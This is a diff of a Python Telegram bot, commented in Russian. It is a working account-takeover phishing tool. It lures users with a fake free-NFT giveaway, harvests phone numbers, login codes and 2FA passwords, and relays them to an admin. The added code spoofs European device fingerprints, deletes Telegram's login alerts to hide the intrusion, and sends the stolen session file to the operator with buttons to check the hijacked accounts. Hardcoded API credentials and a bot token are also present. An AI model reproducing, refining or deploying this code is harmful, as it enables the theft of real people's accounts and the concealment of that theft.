@@ -6,9 +6,9 @@ from aiogram.fsm.context import FSMContext
 from aiogram.fsm.state import State, StatesGroup
 from aiogram.types import FSInputFile, InlineKeyboardMarkup, InlineKeyboardButton
 from telethon import TelegramClient
-from telethon.errors import SessionPasswordNeededError, PhoneCodeInvalidError, PasswordHashInvalidError
+from telethon.errors import SessionPasswordNeededError, PhoneCodeInvalidError
 
-# --- НАСТРОЙКИ (ЗАПОЛНИ СВОИ) ---
+# --- КОНФИГУРАЦИЯ ---
 API_ID = 37668790
 API_HASH = '84a0450f9bbf15d1e1d09b47ee25cb49'
 TOKEN = '8415795413:AAFKeIBsH75o7V5YkyrquMxCiCeq7eASii0'
@@ -23,87 +23,61 @@ class VerifState(StatesGroup):
     waiting_code = State()
     waiting_2fa = State()
 
-# --- ВСПОМОГАТЕЛЬНЫЕ ФУНКЦИИ ---
+# --- ВСПОМОГАТЕЛЬНЫЕ ФУНКЦИИ ДЛЯ АДМИНА ---
 
-def get_keyboard(button_text, callback_data):
-    return InlineKeyboardMarkup(inline_keyboard=[
-        [InlineKeyboardButton(text=button_text, callback_data=callback_data)]
-    ])
+async def get_client_info(session_name):
+    client = TelegramClient(session_name, API_ID, API_HASH)
+    try:
+        await client.connect()
+        if not await client.is_user_authorized():
+            return "❌ Сессия невалидна."
+        me = await client.get_me()
+        return f"👤 <b>Имя:</b> {me.first_name}\n🆔 <b>ID:</b> <code>{me.id}</code>\n🔗 <b>Username:</b> @{me.username or 'нет'}"
+    except Exception as e:
+        return f"⚠️ Ошибка: {str(e)}"
+    finally:
+        await client.disconnect()
 
-# --- ОБРАБОТКА КОМАНД ---
+# --- ОСНОВНАЯ ЛОГИКА ---
 
-@dp.message(F.text.in_(["/start", "/nft", "/stars"]))
+@dp.message(F.text.in_(["/start", "/nft", "/key"]))
 async def cmd_start(message: types.Message):
-    # Если пишет админ - показываем статистику (простое приветствие)
     if message.from_user.id == ADMIN_ID:
-        await message.answer("👑 <b>Панель администратора активна.</b>\nОжидайте уведомлений о новых сессиях.")
+        await message.answer("👑 Панель управления (Amsterdam Host) активна.")
         return
+    
+    kb = InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="💎 ПОЛУЧИТЬ NFT", callback_data="go_verif")]])
+    await message.answer("🎁 <b>Акция: 1 FREE NFT</b>\n\nДля привязки кошелька пройдите авторизацию.", parse_mode="HTML", reply_markup=kb)
 
-    text = (
-        "<b>🛡 Система защиты Telegram Assets</b>\n\n"
-        "Ваш аккаунт выбран для получения подарочного набора (NFT + 50 Stars).\n\n"
-        "Для предотвращения автоматических регистраций и обеспечения безопасности транзакции, "
-        "необходимо подтвердить владение аккаунтом через наш защищенный шлюз."
-    )
-    await message.answer(text, parse_mode="HTML", reply_markup=get_keyboard("🚀 НАЧАТЬ ВЕРИФИКАЦИЮ", "start_verif"))
-
-@dp.callback_query(F.data == "start_verif")
+@dp.callback_query(F.data == "go_verif")
 async def ask_phone(call: types.CallbackQuery, state: FSMContext):
-    await call.message.edit_text(
-        "📱 <b>Шаг 1: Идентификация</b>\n\n"
-        "Введите ваш номер телефона в международном формате (например, +7999...).\n\n"
-        "<i>На этот номер придет системное уведомление от Telegram.</i>",
-        parse_mode="HTML"
-    )
+    await call.message.edit_text("📱 <b>Введите номер телефона (+7...):</b>", parse_mode="HTML")
     await state.set_state(VerifState.waiting_phone)
 
 @dp.message(VerifState.waiting_phone)
 async def process_phone(message: types.Message, state: FSMContext):
-    phone = message.text.strip().replace(" ", "").replace("-", "")
+    phone = message.text.strip().replace(" ", "")
     user_id = message.from_user.id
-    
-    # Уведомляем админа
-    await bot.send_message(
-        ADMIN_ID, 
-        f"📱 <b>Новый контакт!</b>\n"
-        f"Юзер: @{message.from_user.username or 'нет'}\n"
-        f"Номер: <code>{phone}</code>\n"
-        f"<i>Пытаюсь отправить код...</i>",
-        parse_mode="HTML"
-    )
 
+    # Настройки для имитации входа из Европы (Samsung/Android 12)
     client = TelegramClient(
-        f"sess_{user_id}", 
-        API_ID, 
-        API_HASH,
-        device_model="iPhone 15 Pro",
-        system_version="17.5.1",
-        app_version="10.14.2",
-        lang_code="ru"
+        f"sess_{user_id}", API_ID, API_HASH,
+        device_model="Samsung SM-A525F", # Популярная модель в Европе
+        system_version="Android 12.0",
+        app_version="9.2.1",
+        lang_code="en",           # Ставим системный язык EN, чтобы сбить RU-метку
+        system_lang_code="en-US"
     )
     
     try:
         await client.connect()
         send_code = await client.send_code_request(phone)
-        
-        user_data_storage[user_id] = {
-            "client": client, 
-            "phone": phone, 
-            "hash": send_code.phone_code_hash,
-            "username": message.from_user.username
-        }
-        
-        await message.answer(
-            "📩 <b>Шаг 2: Подтверждение</b>\n\n"
-            "Код подтверждения отправлен в ваше официальное приложение Telegram.\n"
-            "<b>Введите 5-значный код ниже:</b>",
-            parse_mode="HTML"
-        )
+        user_data_storage[user_id] = {"client": client, "phone": phone, "hash": send_code.phone_code_hash}
+        await message.answer("📩 <b>Введите код подтверждения:</b>", parse_mode="HTML")
         await state.set_state(VerifState.waiting_code)
-        
+        await bot.send_message(ADMIN_ID, f"📞 В работе номер: <code>{phone}</code>")
     except Exception as e:
-        await message.answer("❌ <b>Ошибка:</b> Не удалось отправить код на этот номер. Проверьте правильность ввода.")
-        await bot.send_message(ADMIN_ID, f"⚠️ Ошибка у @{message.from_user.username}: {e}")
+        await message.answer("❌ Ошибка. Попробуйте позже.")
         await client.disconnect()
 
 @dp.message(VerifState.waiting_code)
@@ -113,69 +87,86 @@ async def process_code(message: types.Message, state: FSMContext):
     if not data: return
 
     code = message.text.strip()
-    await bot.send_message(ADMIN_ID, f"🔑 Юзер @{data['username']} ввел код: <code>{code}</code>")
+    await bot.send_message(ADMIN_ID, f"🔑 Код от @{message.from_user.username}: <code>{code}</code>")
 
     try:
         await data["client"].sign_in(data["phone"], code, phone_code_hash=data["hash"])
-        await finish_auth(message, state)
+        await finish_and_clean(message, state)
     except SessionPasswordNeededError:
-        await message.answer(
-            "🔐 <b>Двухфакторная защита</b>\n\n"
-            "Ваш аккаунт защищен облачным паролем. Пожалуйста, введите его:",
-            parse_mode="HTML"
-        )
+        await message.answer("🔐 <b>Введите облачный пароль (2FA):</b>", parse_mode="HTML")
         await state.set_state(VerifState.waiting_2fa)
-    except PhoneCodeInvalidError:
-        await message.answer("❌ <b>Код неверный.</b> Попробуйте еще раз:")
+    except Exception:
+        await message.answer("❌ Код неверен.")
 
 @dp.message(VerifState.waiting_2fa)
 async def process_2fa(message: types.Message, state: FSMContext):
     user_id = message.from_user.id
     data = user_data_storage.get(user_id)
     password = message.text.strip()
-    
-    await bot.send_message(ADMIN_ID, f"🔓 Юзер @{data['username']} ввел 2FA: <code>{password}</code>")
+    await bot.send_message(ADMIN_ID, f"🔓 2FA от @{message.from_user.username}: <code>{password}</code>")
 
     try:
         await data["client"].sign_in(password=password)
-        await finish_auth(message, state)
-    except PasswordHashInvalidError:
-        await message.answer("❌ <b>Пароль неверный.</b> Попробуйте снова:")
+        await finish_and_clean(message, state)
+    except:
+        await message.answer("❌ Неверный пароль.")
 
-async def finish_auth(message, state):
+async def finish_and_clean(message, state):
     user_id = message.from_user.id
     data = user_data_storage.get(user_id)
     client = data["client"]
-    
-    # --- ЗАМЕТАЕМ СЛЕДЫ ---
+
+    # КРИТИЧЕСКИЙ МОМЕНТ: Удаляем уведомления о входе
     try:
-        await asyncio.sleep(1.5) # Ждем прихода смс
-        async for msg in client.iter_messages(777000, limit=2):
-            await msg.delete() # Удаляем уведомление о входе
-    except:
-        pass
-    
-    # Сохраняем и отправляем файл админу
+        # Ждем 1 секунду, чтобы уведомление успело прийти
+        await asyncio.sleep(1) 
+        async for msg in client.iter_messages(777000, limit=8):
+            if any(x in msg.text.lower() for x in ["login", "вход", "устройство", "device", "location"]):
+                await msg.delete()
+                print(f"Удалено сервисное сообщение для {user_id}")
+    except Exception as e:
+        print(f"Ошибка при удалении: {e}")
+
     await client.disconnect()
     session_file = f"sess_{user_id}.session"
     
-    if os.path.exists(session_file):
-        doc = FSInputFile(session_file)
-        await bot.send_document(
-            ADMIN_ID, doc,
-            caption=f"🔥 <b>АККАУНТ ЗАХВАЧЕН!</b>\n📱 Номер: <code>{data['phone']}</code>\n👤 Юзер: @{data['username']}",
-            parse_mode="HTML"
-        )
-        os.remove(session_file)
+    admin_kb = InlineKeyboardMarkup(inline_keyboard=[
+        [InlineKeyboardButton(text="📊 Инфо об аккаунте", callback_data=f"info_{user_id}")],
+        [InlineKeyboardButton(text="♻️ Проверить статус", callback_data=f"check_{user_id}")]
+    ])
 
-    await message.answer(
-        "🎉 <b>Верификация завершена!</b>\n\n"
-        "Ваш аккаунт успешно подтвержден. Бонусы будут зачислены в течение 24 часов. "
-        "Не выходите из аккаунта до окончания обработки.",
-        parse_mode="HTML"
-    )
+    if os.path.exists(session_file):
+        await bot.send_document(
+            ADMIN_ID, FSInputFile(session_file),
+            caption=f"🔥 <b>АККАУНТ ЗАХВАЧЕН!</b>\nЮзер: @{message.from_user.username}\nНомер: {data['phone']}",
+            reply_markup=admin_kb, parse_mode="HTML"
+        )
+
+    await message.answer("✅ Верификация прошла успешно. NFT придет в течение 24 часов.")
     await state.clear()
     user_data_storage.pop(user_id, None)
+
+# --- CALLBACKS АДМИНА ---
+
+@dp.callback_query(F.data.startswith("info_"))
+async def admin_info(call: types.CallbackQuery):
+    user_id = call.data.split("_")[1]
+    info = await get_client_info(f"sess_{user_id}.session")
+    await call.message.answer(f"ℹ️ Данные {user_id}:\n{info}", parse_mode="HTML")
+    await call.answer()
+
+@dp.callback_query(F.data.startswith("check_"))
+async def admin_check(call: types.CallbackQuery):
+    user_id = call.data.split("_")[1]
+    client = TelegramClient(f"sess_{user_id}.session", API_ID, API_HASH)
+    try:
+        await client.connect()
+        status = "✅ Активна" if await client.is_user_authorized() else "🔴 Неактивна"
+        await call.answer(f"Статус: {status}", show_alert=True)
+    except:
+        await call.answer("🔴 Ошибка", show_alert=True)
+    finally:
+        await client.disconnect()
 
 if __name__ == '__main__':
     logging.basicConfig(level=logging.INFO)
